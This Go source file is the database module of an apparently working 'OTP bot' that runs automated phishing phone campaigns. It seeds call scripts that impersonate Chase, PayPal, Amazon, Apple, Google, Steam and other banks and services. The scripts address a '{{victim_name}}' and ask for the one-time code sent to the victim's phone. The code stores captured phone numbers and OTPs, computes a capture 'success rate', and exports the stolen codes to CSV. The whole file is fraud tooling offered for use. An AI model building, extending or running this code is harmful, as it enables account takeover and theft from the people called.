package db

import (
	"database/sql"
	"errors"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/USERNAME/goland-otpbot-api/models"
	_ "github.com/mattn/go-sqlite3"
)

var ErrDatabaseNotInitialized = errors.New("database has not been initialized")

var ErrRecordNotFound = errors.New("record not found")

type Database struct {
	db *sql.DB
	mu sync.RWMutex
}

var (
	instance *Database
	once     sync.Once
	initErr  error
)

func Initialize(dbPath string) (*Database, error) {
	once.Do(func() {
		instance, initErr = initializeDB(dbPath)
	})
	return instance, initErr
}

func initializeDB(dbPath string) (*Database, error) {

	dir := filepath.Dir(dbPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return nil, fmt.Errorf("failed to create database directory: %w", err)
	}

	db := &Database{}
	var err error

	db.db, err = sql.Open("sqlite3", dbPath+"?_journal_mode=WAL&_busy_timeout=5000&_foreign_keys=ON")
	if err != nil {
		return nil, fmt.Errorf("failed to open database: %w", err)
	}

	if err := db.db.Ping(); err != nil {
		return nil, fmt.Errorf("failed to ping database: %w", err)
	}

	if err := db.createTables(); err != nil {
		return nil, fmt.Errorf("failed to create tables: %w", err)
	}

	return db, nil
}

func Get() *Database {
	return instance
}

func MustGet() *Database {
	if instance == nil {
		panic("database not initialized")
	}
	return instance
}

func (d *Database) isInitialized() error {
	if d == nil || d.db == nil {
		return ErrDatabaseNotInitialized
	}
	return nil
}

func (d *Database) createTables() error {
	queries := []string{
		`CREATE TABLE IF NOT EXISTS campaigns (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			name TEXT NOT NULL,
			service TEXT NOT NULL,
			status TEXT DEFAULT 'pending',
			total_calls INTEGER DEFAULT 0,
			completed INTEGER DEFAULT 0,
			captures INTEGER DEFAULT 0,
			concurrency INTEGER DEFAULT 5,
			created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
			started_at DATETIME,
			completed_at DATETIME,
			schedule_at DATETIME
		)`,
		`CREATE TABLE IF NOT EXISTS calls (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			campaign_id INTEGER NOT NULL,
			phone TEXT NOT NULL,
			status TEXT DEFAULT 'pending',
			duration INTEGER DEFAULT 0,
			plivo_call_id TEXT,
			started_at DATETIME,
			answered_at DATETIME,
			ended_at DATETIME,
			FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
		)`,
		`CREATE TABLE IF NOT EXISTS captures (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			call_id INTEGER,
			campaign_id INTEGER,
			phone TEXT NOT NULL,
			otp TEXT NOT NULL,
			service TEXT NOT NULL,
			captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
			FOREIGN KEY (call_id) REFERENCES calls(id),
			FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
		)`,
		`CREATE TABLE IF NOT EXISTS templates (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			name TEXT UNIQUE NOT NULL,
			voice TEXT DEFAULT 'en-US-WOMAN',
			greeting TEXT NOT NULL,
			action_prompt TEXT NOT NULL,
			otp_prompt TEXT NOT NULL,
			confirmation TEXT NOT NULL,
			fallback_message TEXT DEFAULT 'Call Ended',
			hold_music TEXT,
			category TEXT DEFAULT 'other',
			icon TEXT DEFAULT '📱',
			created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
			updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
		)`,
		`CREATE TABLE IF NOT EXISTS logs (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			level TEXT NOT NULL,
			message TEXT NOT NULL,
			details TEXT,
			created_at DATETIME DEFAULT CURRENT_TIMESTAMP
		)`,
		`CREATE INDEX IF NOT EXISTS idx_calls_campaign ON calls(campaign_id)`,
		`CREATE INDEX IF NOT EXISTS idx_calls_status ON calls(status)`,
		`CREATE INDEX IF NOT EXISTS idx_captures_campaign ON captures(campaign_id)`,
		`CREATE INDEX IF NOT EXISTS idx_logs_created ON logs(created_at)`,
	}

	for _, query := range queries {
		if _, err := d.db.Exec(query); err != nil {
			return fmt.Errorf("failed to create table: %w", err)
		}
	}

	if err := d.insertDefaultTemplates(); err != nil {
		return err
	}

	if err := d.migrateTemplatesAddCategoryIcon(); err != nil {
		log.Printf("Warning: migration for category/icon columns failed: %v", err)
	}

	return nil
}

// migrateTemplatesAddCategoryIcon adds category and icon columns if they don't exist
func (d *Database) migrateTemplatesAddCategoryIcon() error {
	d.mu.Lock()
	defer d.mu.Unlock()

	migrations := []string{
		`ALTER TABLE templates ADD COLUMN category TEXT DEFAULT 'other'`,
		`ALTER TABLE templates ADD COLUMN icon TEXT DEFAULT '📱'`,
	}

	for _, migration := range migrations {
		if _, err := d.db.Exec(migration); err != nil {
			if !strings.Contains(err.Error(), "duplicate column name") {
				return fmt.Errorf("migration failed: %w", err)
			}
		}
	}

	return nil
}

func (d *Database) insertDefaultTemplates() error {
	templates := []struct {
		name, voice, greeting, action_prompt, otp_prompt, confirmation, fallback, hold_music, category, icon string
	}{
		{
			name:          "chase",
			voice:         "en-US-WOMAN",
			greeting:      "Hello {{victim_name}}. This is Chase Bank fraud prevention calling about a charge of {{amount}}. If this was not you, please press 1 to verify your identity.",
			action_prompt: "Press 1 now to verify your account and block this transaction.",
			otp_prompt:    "For your security, please enter the one-time code sent to your phone. Press hash when finished.",
			confirmation:  "Thank you. Your account is now secure and the transaction has been blocked. Have a great day.",
			fallback:      "Call Ended",
			hold_music:    "",
			category:      "banking",
			icon:          "🏦",
		},
		{
			name:          "bank_of_america",
			voice:         "en-US-WOMAN",
			greeting:      "Hello {{victim_name}}. This is Bank of America security department. We have detected unusual activity on your account. If this was you, press 1 to confirm.",
			action_prompt: "To verify your identity, please press 1.",
			otp_prompt:    "Please enter the verification code sent to your registered mobile number. Press hash when complete.",
			confirmation:  "Thank you. Your identity has been verified. Your account is now secure.",
			fallback:      "Call Ended",
			hold_music:    "",
			category:      "banking",
			icon:          "🏦",
		},
		{
			name:          "paypal",
			voice:         "en-US-WOMAN",
			greeting:      "Hello {{victim_name}}. This is PayPal security calling about a payment of {{amount}} from your account. If this was not you, press 1 immediately.",
			action_prompt: "Press 1 to verify your identity and cancel this payment.",
			otp_prompt:    "Please enter the 6-digit security code sent to your phone. Press hash when finished.",
			confirmation:  "Thank you. The payment has been cancelled and your account is protected. Goodbye.",
			fallback:      "Call Ended",
			hold_music:    "",
			category:      "ecommerce",
			icon:          "🛒",
		},
		{
			name:          "amazon",
			voice:         "en-US-WOMAN",
			greeting:      "Hello {{victim_name}}. This is Amazon customer service calling about your order number {{order_id}}. If you did not place this order, press 1.",
			action_prompt: "Press 1 to speak with a representative and verify your account.",
			otp_prompt:    "Please enter the one-time password sent to your email or phone. Press hash when complete.",
			confirmation:  "Thank you for calling Amazon. Your account has been secured.",
			fallback:      "Call Ended",
			hold_music:    "",
			category:      "ecommerce",
			icon:          "📦",
		},
		{
			name:          "netflix",
			voice:         "en-US-WOMAN",
			greeting:      "Hello {{victim_name}}. This is Netflix billing department. We were unable to process your payment for {{amount}}. Please press 1 to update your payment information.",
			action_prompt: "Press 1 to speak with our billing team.",
			otp_prompt:    "Please enter the verification code sent to your email. Press hash when finished.",
			confirmation:  "Thank you. Your payment information has been updated. Enjoy Netflix!",
			fallback:      "Call Ended",
			hold_music:    "",
			category:      "ecommerce",
			icon:          "🎬",
		},
		{
			name:          "apple",
			voice:         "en-US-WOMAN",
			greeting:      "Hello {{victim_name}}. This is Apple Support. We detected a new sign in to your Apple ID from a device. If this was not you, press 1 to secure your account.",
			action_prompt: "Press 1 to verify your identity and change your password.",
			otp_prompt:    "Please enter the 6-digit code sent to your trusted device. Press hash when complete.",
			confirmation:  "Your Apple ID has been secured. Thank you for calling Apple Support.",
			fallback:      "Call Ended",
			hold_music:    "",
			category:      "tech",
			icon:          "🍎",
		},
		{
			name:          "google",
			voice:         "en-US-WOMAN",
			greeting:      "Hello {{victim_name}}. This is Google Security Alert. Someone tried to access your account from an unrecognized device. If this was not you, press 1.",
			action_prompt: "Press 1 to secure your account and review recent activity.",
			otp_prompt:    "Please enter the verification code sent to your recovery phone or email. Press hash when finished.",
			confirmation:  "Your account has been secured. You can review the activity in your Google account settings.",
			fallback:      "Call Ended",
			hold_music:    "",
			category:      "tech",
			icon:          "🔍",
		},
		{
			name:          "steam",
			voice:         "en-US-MAN",
			greeting:      "Hello {{victim_name}}. This is Steam Support calling about a trade offer worth {{amount}}. If you did not authorize this, press 1.",
			action_prompt: "Press 1 to verify your identity and cancel the trade.",
			otp_prompt:    "Please enter the Steam Guard code sent to your email. Press hash when complete.",
			confirmation:  "Your trade has been cancelled and your account is secure. Thank you for calling Steam.",
			fallback:      "Call Ended",
			hold_music:    "",
			category:      "tech",
			icon:          "🎮",
		},
		{
			name:          "wells_fargo",
			voice:         "en-US-WOMAN",
			greeting:      "Hello {{victim_name}}. This is Wells Fargo fraud detection calling about a withdrawal of {{amount}} from your account. If this was not you, press 1 now.",
			action_prompt: "Press 1 to verify your identity and block this transaction.",
			otp_prompt:    "Please enter the secure access code sent to your phone. Press hash when finished.",
			confirmation:  "Thank you. The transaction has been blocked and your account is protected. Goodbye.",
			fallback:      "Call Ended",
			hold_music:    "",
			category:      "banking",
			icon:          "🏦",
		},
		{
			name:          "citi",
			voice:         "en-US-WOMAN",
			greeting:      "Hello {{victim_name}}. This is Citibank fraud prevention. We have noticed a charge of {{amount}} on your card. If this was not authorized, press 1.",
			action_prompt: "Press 1 to speak with our fraud team and verify your account.",
			otp_prompt:    "Please enter the one-time password sent to your mobile device. Press hash when complete.",
			confirmation:  "Thank you for calling Citibank. Your card has been blocked and a new one will be sent.",
			fallback:      "Call Ended",
			hold_music:    "",
			category:      "banking",
			icon:          "🏦",
		},
	}

	for _, t := range templates {
		_, err := d.db.Exec(`INSERT OR IGNORE INTO templates (name, voice, greeting, action_prompt, otp_prompt, confirmation, fallback_message, hold_music, category, icon) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
			t.name, t.voice, t.greeting, t.action_prompt, t.otp_prompt, t.confirmation, t.fallback, t.hold_music, t.category, t.icon)
		if err != nil {
			return fmt.Errorf("failed to insert template '%s': %w", t.name, err)
		}
	}
	return nil
}

func (d *Database) CreateCampaign(name, service string, concurrency int) (int64, error) {
	if err := d.isInitialized(); err != nil {
		return 0, err
	}
	d.mu.Lock()
	defer d.mu.Unlock()

	result, err := d.db.Exec(
		"INSERT INTO campaigns (name, service, concurrency, created_at) VALUES (?, ?, ?, ?)",
		name, service, concurrency, time.Now(),
	)
	if err != nil {
		return 0, fmt.Errorf("failed to create campaign: %w", err)
	}
	id, err := result.LastInsertId()
	if err != nil {
		return 0, fmt.Errorf("failed to get campaign ID: %w", err)
	}
	return id, nil
}

func (d *Database) GetCampaign(id int64) (*models.Campaign, error) {
	if err := d.isInitialized(); err != nil {
		return nil, err
	}
	d.mu.RLock()
	defer d.mu.RUnlock()

	c := &models.Campaign{}
	err := d.db.QueryRow(
		"SELECT id, name, service, status, total_calls, completed, captures, concurrency, created_at, started_at, completed_at, schedule_at FROM campaigns WHERE id = ?",
		id,
	).Scan(&c.ID, &c.Name, &c.Service, &c.Status, &c.TotalCalls, &c.Completed, &c.Captures, &c.Concurrency, &c.CreatedAt, &c.StartedAt, &c.CompletedAt, &c.ScheduleAt)
	if err != nil {
		if errors.Is(err, sql.ErrNoRows) {
			return nil, ErrRecordNotFound
		}
		return nil, fmt.Errorf("failed to get campaign: %w", err)
	}
	return c, nil
}

func (d *Database) GetAllCampaigns() ([]models.Campaign, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	rows, err := d.db.Query("SELECT id, name, service, status, total_calls, completed, captures, concurrency, created_at, started_at, completed_at, schedule_at FROM campaigns ORDER BY created_at DESC")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var campaigns []models.Campaign
	for rows.Next() {
		var c models.Campaign
		if err := rows.Scan(&c.ID, &c.Name, &c.Service, &c.Status, &c.TotalCalls, &c.Completed, &c.Captures, &c.Concurrency, &c.CreatedAt, &c.StartedAt, &c.CompletedAt, &c.ScheduleAt); err != nil {
			return nil, err
		}
		campaigns = append(campaigns, c)
	}
	return campaigns, nil
}

func (d *Database) UpdateCampaignStatus(id int64, status string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	_, err := d.db.Exec("UPDATE campaigns SET status = ? WHERE id = ?", status, id)
	return err
}

func (d *Database) UpdateCampaignStats(id int64, completed, captures int) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	_, err := d.db.Exec("UPDATE campaigns SET completed = ?, captures = ? WHERE id = ?", completed, captures, id)
	return err
}

func (d *Database) IncrementCampaignStats(id int64) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	_, err := d.db.Exec("UPDATE campaigns SET completed = completed + 1 WHERE id = ?", id)
	return err
}

func (d *Database) IncrementCampaignCaptures(id int64) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	_, err := d.db.Exec("UPDATE campaigns SET captures = captures + 1 WHERE id = ?", id)
	return err
}

func (d *Database) SetCampaignTotalCalls(id int64, total int) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	_, err := d.db.Exec("UPDATE campaigns SET total_calls = ? WHERE id = ?", total, id)
	return err
}

func (d *Database) StartCampaign(id int64) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	now := time.Now()
	_, err := d.db.Exec("UPDATE campaigns SET status = 'active', started_at = ? WHERE id = ?", now, id)
	return err
}

func (d *Database) CompleteCampaign(id int64) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	now := time.Now()
	_, err := d.db.Exec("UPDATE campaigns SET status = 'completed', completed_at = ? WHERE id = ?", now, id)
	return err
}

func (d *Database) DeleteCampaign(id int64) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	d.db.Exec("DELETE FROM captures WHERE campaign_id = ?", id)
	d.db.Exec("DELETE FROM calls WHERE campaign_id = ?", id)
	_, err := d.db.Exec("DELETE FROM campaigns WHERE id = ?", id)
	return err
}

func (d *Database) CreateCall(campaignID int64, phone string) (int64, error) {
	d.mu.Lock()
	defer d.mu.Unlock()

	result, err := d.db.Exec(
		"INSERT INTO calls (campaign_id, phone, status, started_at) VALUES (?, ?, 'pending', ?)",
		campaignID, phone, time.Now(),
	)
	if err != nil {
		return 0, err
	}
	return result.LastInsertId()
}

func (d *Database) UpdateCallStatus(id int64, status string, plivoCallID string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	now := time.Now()
	if status == "answered" {
		_, err := d.db.Exec("UPDATE calls SET status = ?, plivo_call_id = ?, answered_at = ? WHERE id = ?", status, plivoCallID, now, id)
		return err
	}
	_, err := d.db.Exec("UPDATE calls SET status = ?, plivo_call_id = ? WHERE id = ?", status, plivoCallID, id)
	return err
}

func (d *Database) UpdateCallDuration(id int64, duration int) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	_, err := d.db.Exec("UPDATE calls SET duration = ?, ended_at = ? WHERE id = ?", duration, time.Now(), id)
	return err
}

func (d *Database) GetCallsByCampaign(campaignID int64) ([]models.Call, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	rows, err := d.db.Query("SELECT id, campaign_id, phone, status, duration, plivo_call_id, started_at, answered_at, ended_at FROM calls WHERE campaign_id = ?", campaignID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var calls []models.Call
	for rows.Next() {
		var c models.Call
		if err := rows.Scan(&c.ID, &c.CampaignID, &c.Phone, &c.Status, &c.Duration, &c.PlivoCallID, &c.StartedAt, &c.AnsweredAt, &c.EndedAt); err != nil {
			return nil, err
		}
		calls = append(calls, c)
	}
	return calls, nil
}

func (d *Database) GetCall(id int64) (*models.Call, error) {
	if err := d.isInitialized(); err != nil {
		return nil, err
	}
	d.mu.RLock()
	defer d.mu.RUnlock()

	c := &models.Call{}
	err := d.db.QueryRow(
		"SELECT id, campaign_id, phone, status, duration, plivo_call_id, started_at, answered_at, ended_at FROM calls WHERE id = ?",
		id,
	).Scan(&c.ID, &c.CampaignID, &c.Phone, &c.Status, &c.Duration, &c.PlivoCallID, &c.StartedAt, &c.AnsweredAt, &c.EndedAt)
	if err != nil {
		if errors.Is(err, sql.ErrNoRows) {
			return nil, ErrRecordNotFound
		}
		return nil, fmt.Errorf("failed to get call: %w", err)
	}
	return c, nil
}

func (d *Database) GetCampaignCallStats(campaignID int64) (answered, voicemails, noAnswers, failed int, err error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	rows, err := d.db.Query("SELECT status FROM calls WHERE campaign_id = ?", campaignID)
	if err != nil {
		return
	}
	defer rows.Close()

	for rows.Next() {
		var status string
		if err := rows.Scan(&status); err != nil {
			return 0, 0, 0, 0, err
		}
		switch status {
		case "answered":
			answered++
		case "voicemail":
			voicemails++
		case "no_answer":
			noAnswers++
		case "failed", "busy":
			failed++
		}
	}
	return
}

func (d *Database) CreateCapture(callID, campaignID int64, phone, otp, service string) (int64, error) {
	d.mu.Lock()
	defer d.mu.Unlock()

	result, err := d.db.Exec(
		"INSERT INTO captures (call_id, campaign_id, phone, otp, service, captured_at) VALUES (?, ?, ?, ?, ?, ?)",
		callID, campaignID, phone, otp, service, time.Now(),
	)
	if err != nil {
		return 0, err
	}
	return result.LastInsertId()
}

func (d *Database) GetCapturesByCampaign(campaignID int64) ([]models.Capture, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	rows, err := d.db.Query("SELECT id, call_id, campaign_id, phone, otp, service, captured_at FROM captures WHERE campaign_id = ? ORDER BY captured_at DESC", campaignID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var captures []models.Capture
	for rows.Next() {
		var c models.Capture
		if err := rows.Scan(&c.ID, &c.CallID, &c.CampaignID, &c.Phone, &c.OTP, &c.Service, &c.CapturedAt); err != nil {
			return nil, err
		}
		captures = append(captures, c)
	}
	return captures, nil
}

func (d *Database) GetRecentCaptures(limit int) ([]models.Capture, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	rows, err := d.db.Query("SELECT id, call_id, campaign_id, phone, otp, service, captured_at FROM captures ORDER BY captured_at DESC LIMIT ?", limit)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var captures []models.Capture
	for rows.Next() {
		var c models.Capture
		if err := rows.Scan(&c.ID, &c.CallID, &c.CampaignID, &c.Phone, &c.OTP, &c.Service, &c.CapturedAt); err != nil {
			return nil, err
		}
		captures = append(captures, c)
	}
	return captures, nil
}

func (d *Database) GetAllCaptures() ([]models.Capture, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	rows, err := d.db.Query("SELECT id, call_id, campaign_id, phone, otp, service, captured_at FROM captures ORDER BY captured_at DESC")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var captures []models.Capture
	for rows.Next() {
		var c models.Capture
		if err := rows.Scan(&c.ID, &c.CallID, &c.CampaignID, &c.Phone, &c.OTP, &c.Service, &c.CapturedAt); err != nil {
			return nil, err
		}
		captures = append(captures, c)
	}
	return captures, nil
}

func (d *Database) CreateTemplate(name, voice, greeting, action_prompt, otp_prompt, confirmation, fallback, hold_music, category, icon string) (int64, error) {
	d.mu.Lock()
	defer d.mu.Unlock()

	now := time.Now()
	result, err := d.db.Exec(
		"INSERT INTO templates (name, voice, greeting, action_prompt, otp_prompt, confirmation, fallback_message, hold_music, category, icon, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
		name, voice, greeting, action_prompt, otp_prompt, confirmation, fallback, hold_music, category, icon, now, now,
	)
	if err != nil {
		return 0, err
	}
	return result.LastInsertId()
}

func (d *Database) GetTemplate(name string) (*models.Template, error) {
	if err := d.isInitialized(); err != nil {
		return nil, err
	}
	d.mu.RLock()
	defer d.mu.RUnlock()

	t := &models.Template{}
	err := d.db.QueryRow(
		"SELECT id, name, voice, greeting, action_prompt, otp_prompt, confirmation, fallback_message, hold_music, COALESCE(category, 'other') as category, COALESCE(icon, '📱') as icon, created_at, updated_at FROM templates WHERE name = ?",
		name,
	).Scan(&t.ID, &t.Name, &t.Voice, &t.Greeting, &t.ActionPrompt, &t.OTPPrompt, &t.Confirmation, &t.FallbackMessage, &t.HoldMusic, &t.Category, &t.Icon, &t.CreatedAt, &t.UpdatedAt)
	if err != nil {
		if errors.Is(err, sql.ErrNoRows) {
			return nil, ErrRecordNotFound
		}
		return nil, fmt.Errorf("failed to get template: %w", err)
	}
	return t, nil
}

func (d *Database) GetAllTemplates() ([]models.Template, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	rows, err := d.db.Query("SELECT id, name, voice, greeting, action_prompt, otp_prompt, confirmation, fallback_message, hold_music, COALESCE(category, 'other') as category, COALESCE(icon, '📱') as icon, created_at, updated_at FROM templates ORDER BY name")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var templates []models.Template
	for rows.Next() {
		var t models.Template
		if err := rows.Scan(&t.ID, &t.Name, &t.Voice, &t.Greeting, &t.ActionPrompt, &t.OTPPrompt, &t.Confirmation, &t.FallbackMessage, &t.HoldMusic, &t.Category, &t.Icon, &t.CreatedAt, &t.UpdatedAt); err != nil {
			return nil, err
		}
		templates = append(templates, t)
	}
	return templates, nil
}

func (d *Database) UpdateTemplate(name, voice, greeting, action_prompt, otp_prompt, confirmation, fallback, hold_music, category, icon string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	_, err := d.db.Exec(
		"UPDATE templates SET voice = ?, greeting = ?, action_prompt = ?, otp_prompt = ?, confirmation = ?, fallback_message = ?, hold_music = ?, category = ?, icon = ?, updated_at = ? WHERE name = ?",
		voice, greeting, action_prompt, otp_prompt, confirmation, fallback, hold_music, category, icon, time.Now(), name,
	)
	return err
}

func (d *Database) DeleteTemplate(name string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	_, err := d.db.Exec("DELETE FROM templates WHERE name = ?", name)
	return err
}

func (d *Database) CreateLog(level, message, details string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	_, err := d.db.Exec(
		"INSERT INTO logs (level, message, details, created_at) VALUES (?, ?, ?, ?)",
		level, message, details, time.Now(),
	)
	return err
}

func (d *Database) GetLogs(limit int) ([]models.LogEntry, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	rows, err := d.db.Query("SELECT id, level, message, details, created_at FROM logs ORDER BY created_at DESC LIMIT ?", limit)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var logs []models.LogEntry
	for rows.Next() {
		var l models.LogEntry
		if err := rows.Scan(&l.ID, &l.Level, &l.Message, &l.Details, &l.CreatedAt); err != nil {
			return nil, err
		}
		logs = append(logs, l)
	}
	return logs, nil
}

func (d *Database) GetGlobalStats() (*models.GlobalStats, error) {
	if err := d.isInitialized(); err != nil {
		return nil, err
	}
	d.mu.RLock()
	defer d.mu.RUnlock()

	stats := &models.GlobalStats{}

	scanCountSilentLocal := func(query string, args ...interface{}) int64 {
		var count int64
		err := d.db.QueryRow(query, args...).Scan(&count)
		if err != nil && !errors.Is(err, sql.ErrNoRows) {
			return 0
		}
		return count
	}

	stats.TotalCampaigns = int(scanCountSilentLocal("SELECT COUNT(*) FROM campaigns"))
	stats.ActiveCampaigns = int(scanCountSilentLocal("SELECT COUNT(*) FROM campaigns WHERE status = 'active'"))
	stats.PausedCampaigns = int(scanCountSilentLocal("SELECT COUNT(*) FROM campaigns WHERE status = 'paused'"))
	stats.CompletedCampaigns = int(scanCountSilentLocal("SELECT COUNT(*) FROM campaigns WHERE status = 'completed'"))

	stats.TotalCalls = scanCountSilentLocal("SELECT COUNT(*) FROM calls")
	stats.AnsweredCalls = scanCountSilentLocal("SELECT COUNT(*) FROM calls WHERE status = 'answered'")
	stats.Voicemails = scanCountSilentLocal("SELECT COUNT(*) FROM calls WHERE status = 'voicemail'")
	stats.FailedCalls = scanCountSilentLocal("SELECT COUNT(*) FROM calls WHERE status IN ('failed', 'no_answer', 'cancelled')")

	stats.TotalCaptures = scanCountSilentLocal("SELECT COUNT(*) FROM captures")

	if stats.AnsweredCalls > 0 {
		stats.SuccessRate = float64(stats.TotalCaptures) / float64(stats.AnsweredCalls) * 100
	}

	today := time.Now().Format("2006-01-02")
	stats.TodayCalls = scanCountSilentLocal("SELECT COUNT(*) FROM calls WHERE date(started_at) = ?", today)
	stats.TodayCaptures = scanCountSilentLocal("SELECT COUNT(*) FROM captures WHERE date(captured_at) = ?", today)

	return stats, nil
}

func scanCountSilent(db *sql.DB, query string, args ...interface{}) int64 {
	var count int64
	err := db.QueryRow(query, args...).Scan(&count)
	if err != nil && !errors.Is(err, sql.ErrNoRows) {
		return 0
	}
	return count
}

func (d *Database) Backup(path string) error {
	if err := d.isInitialized(); err != nil {
		return err
	}
	d.mu.Lock()
	defer d.mu.Unlock()

	if path == "" {
		return fmt.Errorf("backup path cannot be empty")
	}
	cleanPath := filepath.Clean(path)
	if !filepath.IsAbs(cleanPath) {
		return fmt.Errorf("backup path must be absolute")
	}
	if strings.Contains(cleanPath, "..") {
		return fmt.Errorf("invalid path: parent directory reference not allowed")
	}

	_, err := d.db.Exec(fmt.Sprintf("VACUUM INTO '%s'", cleanPath))
	if err != nil {
		return fmt.Errorf("failed to backup database: %w", err)
	}
	return nil
}
func (d *Database) Close() error {
	if d == nil || d.db == nil {
		return nil
	}
	return d.db.Close()
}

func (d *Database) ExportCaptures() (string, error) {
	if err := d.isInitialized(); err != nil {
		return "", err
	}
	captures, err := d.GetAllCaptures()
	if err != nil {
		return "", fmt.Errorf("failed to get captures: %w", err)
	}

	csv := "ID,Call ID,Campaign ID,Phone,OTP,Service,Captured At\n"
	for _, c := range captures {
		csv += fmt.Sprintf("%d,%d,%d,%s,%s,%s,%s\n", c.ID, c.CallID, c.CampaignID, c.Phone, c.OTP, c.Service, c.CapturedAt.Format(time.RFC3339))
	}
	return csv, nil
}

// CleanupOldCaptures deletes captures older than the specified number of days
func (d *Database) CleanupOldCaptures(days int) (int64, error) {
	if err := d.isInitialized(); err != nil {
		return 0, err
	}
	d.mu.Lock()
	defer d.mu.Unlock()

	cutoff := time.Now().AddDate(0, 0, -days)
	result, err := d.db.Exec("DELETE FROM captures WHERE captured_at < ?", cutoff)
	if err != nil {
		return 0, fmt.Errorf("failed to cleanup captures: %w", err)
	}
	
	deleted, _ := result.RowsAffected()
	return deleted, nil
}

// CleanupOldLogs deletes logs older than the specified number of days
func (d *Database) CleanupOldLogs(days int) (int64, error) {
	if err := d.isInitialized(); err != nil {
		return 0, err
	}
	d.mu.Lock()
	defer d.mu.Unlock()

	cutoff := time.Now().AddDate(0, 0, -days)
	result, err := d.db.Exec("DELETE FROM logs WHERE created_at < ?", cutoff)
	if err != nil {
		return 0, fmt.Errorf("failed to cleanup logs: %w", err)
	}
	
	deleted, _ := result.RowsAffected()
	return deleted, nil
}

// ExportCapturesMasked exports captures with masked phone numbers for secure sharing
func (d *Database) ExportCapturesMasked() (string, error) {
	if err := d.isInitialized(); err != nil {
		return "", err
	}
	captures, err := d.GetAllCaptures()
	if err != nil {
		return "", fmt.Errorf("failed to get captures: %w", err)
	}

	csv := "ID,Call ID,Campaign ID,Masked Phone,OTP,Service,Captured At\n"
	for _, c := range captures {
		maskedPhone := maskPhoneExport(c.Phone)
		csv += fmt.Sprintf("%d,%d,%d,%s,%s,%s,%s\n", c.ID, c.CallID, c.CampaignID, maskedPhone, c.OTP, c.Service, c.CapturedAt.Format(time.RFC3339))
	}
	return csv, nil
}

// maskPhoneExport masks phone numbers for export (shows first 4 and last 2 digits)
func maskPhoneExport(phone string) string {
	if len(phone) <= 6 {
		return strings.Repeat("*", len(phone))
	}
	return phone[:4] + strings.Repeat("*", len(phone)-6) + phone[len(phone)-2:]
}
